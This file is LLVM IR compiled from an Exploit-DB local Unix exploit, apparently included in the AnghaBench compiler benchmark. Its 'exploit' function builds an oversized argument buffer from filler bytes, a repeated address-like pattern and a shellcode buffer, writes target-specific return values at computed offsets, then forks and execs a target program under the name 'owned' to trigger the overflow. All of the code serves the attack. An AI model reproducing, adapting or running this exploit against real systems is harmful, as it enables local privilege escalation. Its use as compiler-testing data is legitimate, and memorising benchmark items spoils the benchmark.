; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_22442.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_22442.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.target_info = type { i32, i32, i64, i64, i64, i32, i64, i64, i64, i32, i32, i32 }

@.str = private unnamed_addr constant [6 x i8] c"owned\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"malloc()\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"\FC\FF\FF\FF\FC\FF\FF\FF\A1\FF\FF\BF\A1\FF\FF\BF\A1\FF\FF\BF\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [3 x i8] c"\FF\\\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"fork()\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"execve()\00", align 1
@SIGKILL = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @exploit(%struct.target_info* byval(%struct.target_info) align 8 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca [3072 x i8], align 16
  %5 = alloca i8*, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4 x i8*], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  store i8* null, i8** %3, align 8
  %12 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 0
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0), i8** %12, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 1
  %14 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 0
  store i8* %14, i8** %13, align 8
  %15 = getelementptr inbounds i8*, i8** %13, i64 1
  %16 = load i8*, i8** %3, align 8
  store i8* %16, i8** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %15, i64 1
  store i8* null, i8** %17, align 8
  %18 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 0
  %19 = load i32, i32* %18, align 8
  %20 = call i64 @malloc(i32 %19)
  %21 = inttoptr i64 %20 to i8*
  store i8* %21, i8** %3, align 8
  %22 = load i8*, i8** %3, align 8
  %23 = icmp ne i8* %22, null
  br i1 %23, label %27, label %24

24:                                               ; preds = %1
  %25 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %26 = call i32 @exit(i32 0) #3
  unreachable

27:                                               ; preds = %1
  %28 = load i8*, i8** %3, align 8
  %29 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 0
  %30 = load i32, i32* %29, align 8
  %31 = call i32 @memset(i8* %28, i8 signext 65, i32 %30)
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 0
  %34 = load i32, i32* %33, align 8
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %32, i64 %35
  %37 = getelementptr inbounds i8, i8* %36, i64 -1
  store i8 0, i8* %37, align 1
  %38 = load i8*, i8** %3, align 8
  store i8* %38, i8** %5, align 8
  br label %39

39:                                               ; preds = %27, %63
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i8** %10, align 8
  %40 = load i8*, i8** %5, align 8
  %41 = load i8*, i8** %10, align 8
  %42 = load i8*, i8** %10, align 8
  %43 = call i32 @strlen(i8* %42)
  %44 = call i32 @memcpy(i8* %40, i8* %41, i32 %43)
  %45 = load i8*, i8** %10, align 8
  %46 = call i32 @strlen(i8* %45)
  %47 = load i8*, i8** %5, align 8
  %48 = sext i32 %46 to i64
  %49 = getelementptr inbounds i8, i8* %47, i64 %48
  store i8* %49, i8** %5, align 8
  %50 = load i8*, i8** %5, align 8
  %51 = load i8*, i8** %10, align 8
  %52 = call i32 @strlen(i8* %51)
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8*, i8** %3, align 8
  %56 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 0
  %57 = load i32, i32* %56, align 8
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %55, i64 %58
  %60 = getelementptr inbounds i8, i8* %59, i64 -1
  %61 = icmp uge i8* %54, %60
  br i1 %61, label %62, label %63

62:                                               ; preds = %39
  br label %64

63:                                               ; preds = %39
  br label %39

64:                                               ; preds = %62
  %65 = load i8*, i8** %3, align 8
  %66 = load i8*, i8** @shellcode, align 8
  %67 = load i8*, i8** @shellcode, align 8
  %68 = call i32 @strlen(i8* %67)
  %69 = call i32 @memcpy(i8* %65, i8* %66, i32 %68)
  %70 = load i8*, i8** %3, align 8
  %71 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 2
  store i8* %70, i8** %71, align 16
  %72 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 0
  %73 = call i32 @memset(i8* %72, i8 signext 65, i32 1200)
  %74 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 1200
  store i8 0, i8* %74, align 16
  store i32 0, i32* %7, align 4
  br label %75

75:                                               ; preds = %84, %64
  %76 = load i32, i32* %7, align 4
  %77 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 1
  %78 = load i32, i32* %77, align 4
  %79 = sub nsw i32 %78, 1200
  %80 = icmp slt i32 %76, %79
  br i1 %80, label %81, label %87

81:                                               ; preds = %75
  %82 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 0
  %83 = call i32 @strcat(i8* %82, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  br label %84

84:                                               ; preds = %81
  %85 = load i32, i32* %7, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %7, align 4
  br label %75

87:                                               ; preds = %75
  %88 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 2
  %89 = load i64, i64* %88, align 8
  %90 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 3
  %91 = load i64, i64* %90, align 8
  %92 = add i64 %89, %91
  %93 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 4
  %94 = load i64, i64* %93, align 8
  %95 = sub i64 %92, %94
  %96 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 %95
  %97 = bitcast i8* %96 to i32*
  store i32* %97, i32** %6, align 8
  %98 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 5
  %99 = load i32, i32* %98, align 8
  %100 = load i32*, i32** %6, align 8
  store i32 %99, i32* %100, align 4
  %101 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 2
  %102 = load i64, i64* %101, align 8
  %103 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 6
  %104 = load i64, i64* %103, align 8
  %105 = add i64 %102, %104
  %106 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 4
  %107 = load i64, i64* %106, align 8
  %108 = sub i64 %105, %107
  %109 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 %108
  %110 = bitcast i8* %109 to i32*
  store i32* %110, i32** %6, align 8
  %111 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 5
  %112 = load i32, i32* %111, align 8
  %113 = sub nsw i32 %112, 44
  %114 = load i32*, i32** %6, align 8
  store i32 %113, i32* %114, align 4
  %115 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 2
  %116 = load i64, i64* %115, align 8
  %117 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 7
  %118 = load i64, i64* %117, align 8
  %119 = add i64 %116, %118
  %120 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 4
  %121 = load i64, i64* %120, align 8
  %122 = sub i64 %119, %121
  %123 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 %122
  %124 = bitcast i8* %123 to i32*
  store i32* %124, i32** %6, align 8
  %125 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 5
  %126 = load i32, i32* %125, align 8
  %127 = load i32*, i32** %6, align 8
  store i32 %126, i32* %127, align 4
  %128 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 2
  %129 = load i64, i64* %128, align 8
  %130 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 8
  %131 = load i64, i64* %130, align 8
  %132 = add i64 %129, %131
  %133 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 4
  %134 = load i64, i64* %133, align 8
  %135 = sub i64 %132, %134
  %136 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 %135
  %137 = bitcast i8* %136 to i32*
  store i32* %137, i32** %6, align 8
  %138 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 9
  %139 = load i32, i32* %138, align 8
  %140 = load i32*, i32** %6, align 8
  store i32 %139, i32* %140, align 4
  %141 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 2
  %142 = load i64, i64* %141, align 8
  %143 = add i64 %142, 4
  %144 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 4
  %145 = load i64, i64* %144, align 8
  %146 = sub i64 %143, %145
  %147 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 %146
  %148 = bitcast i8* %147 to i32*
  store i32* %148, i32** %6, align 8
  %149 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 10
  %150 = load i32, i32* %149, align 4
  %151 = load i32*, i32** %6, align 8
  store i32 %150, i32* %151, align 4
  %152 = call i32 (...) @fork()
  store i32 %152, i32* %8, align 4
  %153 = load i32, i32* %8, align 4
  %154 = icmp eq i32 %153, -1
  br i1 %154, label %155, label %158

155:                                              ; preds = %87
  %156 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %157 = call i32 @exit(i32 -1) #3
  unreachable

158:                                              ; preds = %87
  %159 = load i32, i32* %8, align 4
  %160 = icmp eq i32 %159, 0
  br i1 %160, label %161, label %171

161:                                              ; preds = %158
  %162 = getelementptr inbounds %struct.target_info, %struct.target_info* %0, i32 0, i32 11
  %163 = load i32, i32* %162, align 8
  %164 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 0
  %165 = call i32 @execve(i32 %163, i8** %164, i32* null)
  %166 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0))
  %167 = call i32 (...) @getpid()
  %168 = load i32, i32* @SIGKILL, align 4
  %169 = call i32 @kill(i32 %167, i32 %168)
  %170 = call i32 @exit(i32 0) #3
  unreachable

171:                                              ; preds = %158
  %172 = call i32 @wait(i32* %11)
  %173 = load i32, i32* %11, align 4
  %174 = call i64 @WIFEXITED(i32 %173)
  %175 = icmp eq i64 %174, 0
  br i1 %175, label %176, label %177

176:                                              ; preds = %171
  store i32 0, i32* %2, align 4
  br label %178

177:                                              ; preds = %171
  store i32 1, i32* %2, align 4
  br label %178

178:                                              ; preds = %177, %176
  %179 = load i32, i32* %2, align 4
  ret i32 %179
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @execve(i32, i8**, i32*) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i64 @WIFEXITED(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
